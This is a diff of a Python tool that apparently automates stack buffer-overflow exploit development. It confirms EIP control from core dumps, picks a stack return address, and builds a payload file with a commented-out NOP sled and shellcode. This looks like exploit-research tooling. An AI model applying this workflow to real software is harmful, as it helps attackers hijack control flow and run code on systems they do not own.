@@ -45,7 +45,6 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
         core_path = f'/core_dumps/core.{target_bin}.{rep_proc.pid}'
 
         if os.path.isfile(core_path):
-            # os.remove(core_path)
             return True
 
         else:
@@ -86,11 +85,10 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
     )
     
     #sending the crash input from stdin to all targets
-    # print(f'in root cause analysis, sending the input: {crash_input}')
     crash_proc.communicate(input=crash_input)
 
     if crash_proc.returncode != -11:  #if the mutation did not cause a crash
-        logging.error('in root cause analysis, payload mutation did not cause a crash for some reason. Investigating...')
+        # logging.error('in root cause analysis, payload mutation did not cause a crash for some reason. Investigating...')
         # interactive_gdb(target_bin, ENV_VARS)
         # sys.exit(1)
         #return none when the input does not lead to a crash
@@ -100,58 +98,20 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
     core_path = f'/core_dumps/core.{target_bin}.{crash_proc.pid}'
 
     if core_path not in core_files:
-        logging.error('in root cause analysis, previous crash did not cause a core dump')
+        logging.error('in root cause analysis, previous crash did not generate a core dump')
         sys.exit(1)
     
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder='little')
 
     #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
-    if eip in crash_input:  
-        # interactive_gdb(target_bin, core_path, ENV_VARS)  
+    if eip in crash_input:
+        # interactive_gdb(target_bin, core_path, ENV_VARS)
         return True
 
     #eip still has a valid value, so it wasn't overwritten by the payload. The program prematurely crashed and it did not reach the return address
     else:
         return False
-
-
-def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
-    """
-    Extracts information from the core dump from the previous crash and mutates the crashing input, 
-    returns the mutated input to the root_cause_analysis for further crash testing.
-    """
-
-    #this explorer only works for june with aslr off for the time being
-    payload_mutation = None
-
-    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
-    core_path = core_files[-1]
-
-    core = Corefile(core_path)
-    eip = core.eip.to_bytes(4, byteorder='little')
-    # print(f'value of eip: {eip} ')
-    for register in core.registers:
-
-        reg_value = core.registers[register].to_bytes(4, byteorder='little')
-
-        if reg_value in crash_input:
-            # print(f'{register} crashed with input bytes {reg_value}')
-
-            #strategy on picking valid addresses that will later align with the jump addr??????
-            stack_addr = (core.stack.start + core.stack.stop) // 2
-            stack_addr += 4
-            # print(f'stack base: {stack_base}, stack limit: {stack_limit}, stack middle: {hex(middle)}')
-            # target = b'\xd0\xd0\xff\xff'
-            target = struct.pack('<I', stack_addr)
-            # print(f'target: {target}')
-
-            payload_mutation = crash_input.replace(reg_value, target)
-            # print(f'payload mutation {payload_mutation}')
-
-
-    # print(f'payload mutation {payload_mutation}')
-    return payload_mutation
 
 
 def payload_builder(crash_input: bytes, target_bin: str) -> None:
@@ -172,7 +132,6 @@ def payload_builder(crash_input: bytes, target_bin: str) -> None:
     # payload += b'\x90' * 129000
     # payload += shellcode
 
-    # print(f'payload: {payload}')
     open('payload', 'wb').write(payload)
 
     return
@@ -217,12 +176,55 @@ def target_ra(target_bin: str) -> int:
 
     # print(f"Stack Base: {hex(core.stack.start)}")
     # print(f"Stack Top: {hex(core.stack.stop)}")
+    # print(f"env vars addr: {hex(core.envp_address)}")
 
-    stack_base = core.stack.start
-    stack_limit = core.stack.stop
-    middle = (stack_base + stack_limit) // 2
+    #must check if top, base and env addresses are valid before using them
+    
+    # middle = (core.stack.start + core.stack.stop) // 2
+    middle = (core.envp_address + core.stack.stop) // 2
     middle += 4
 
-    # print(f'core mappings: {core.stack}')
-
     return middle
+
+def verify_eip_control(crash_input: bytes, arg_config: argparse.Namespace):
+
+    #clean up previous core files
+    subprocess.Popen(
+        'rm /core_dumps/*', 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE,
+        shell=True
+    )
+
+    target_bin = arg_config.target
+
+    command = build_command(arg_config, crash_input)
+
+    crash_proc = subprocess.Popen(
+        command,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE, 
+        env={**os.environ, **ENV_VARS}
+    )
+    
+    crash_proc.communicate(input=crash_input)
+    if crash_proc.returncode != -11:
+        logging.error('The crashing input failed to cause a crash.')
+        sys.exit(1)
+
+    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
+    core_path = f'/core_dumps/core.{target_bin}.{crash_proc.pid}'
+
+    if core_path not in core_files:
+        logging.error('In EIP control verifier, the crashing program did not generate a core dump.')
+        sys.exit(1)
+
+    core = Corefile(core_path)
+    eip = core.eip.to_bytes(4, byteorder='little')
+    if eip not in crash_input:
+        logging.error('The crashing input failed to take control of EIP.')
+        sys.exit(1)
+    
+    return
